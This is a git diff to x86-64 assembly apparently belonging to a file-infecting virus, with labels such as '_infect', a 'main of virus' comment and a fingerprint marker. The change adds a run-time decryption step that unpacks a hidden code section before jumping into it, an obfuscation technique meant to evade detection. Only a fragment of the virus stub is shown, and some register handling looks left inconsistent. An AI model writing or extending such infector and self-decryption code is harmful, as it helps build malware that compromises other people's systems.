@@ -13,6 +13,9 @@ global fingerprint
 
 extern entry
 extern decrypt
+extern DECRYPT_ROUTINE
+extern cmpr_start
+extern cmpr_end
 
 global environ
 
@@ -39,9 +42,9 @@ fingerprint: db `AAAAAAAA`,0
 environ: db `00000000`
 
 begin:	
-	pop r15 ;size_t ac
-	mov r14, rsp ;char **av
-	push r15
+	;pop r15 ;size_t ac
+	;mov r14, rsp ;char **av
+	;push r15
 
 	push rax
 	push rbx
@@ -49,55 +52,28 @@ begin:
 	push rdx
 	push rsi
 	push rdi
-	push rbp
 	push rsp
-	push r8
-	push r9
-	push r10
-	push r11
-	push r12
-	push r13
-	pushf
 core:
-	push r15
-	push r14
-	
-	;set environ variable
-	add r15, 1
-	mov rax, r15
-	mov r15, 8
-	mul r15
-	add r14, rax
-	mov QWORD[rel environ], r14
-
 	;get entry_point of the program
 	mov r14, QWORD[rel diff]
 	lea rax, [rel _infect]
 	sub rax, r14
 	mov r14, rax
 
-	;set text_start
-	;mov r13, QWORD[rel text_start]
-	;lea rax, [rel _infect]
-	;sub rax, r13
-	;mov r13, rax
-	;mov QWORD[rel text_start], r13
+	lea rdi, [rel cmpr_start]
+	lea rsi, [rel cmpr_end]
+	sub rsi, rdi ;cmpr_end - cmpr_start
+	lea rdx, [rel key]
+	call DECRYPT_ROUTINE
+	jmp start2
 
-	;pass params to "main" of virus
-	;rdi -> ac, rsi -> av
-	pop rsi ;ptr
-	pop rdi ;size
+section .textcmpr
+start2:
+	
+	;
 	call entry
 
-	popf
-	pop r13
-	pop r12
-	pop r11
-	pop r10
-	pop r9
-	pop r8
 	pop rsp
-	pop rbp
 	pop rdi
 	pop rsi
 	pop rdx
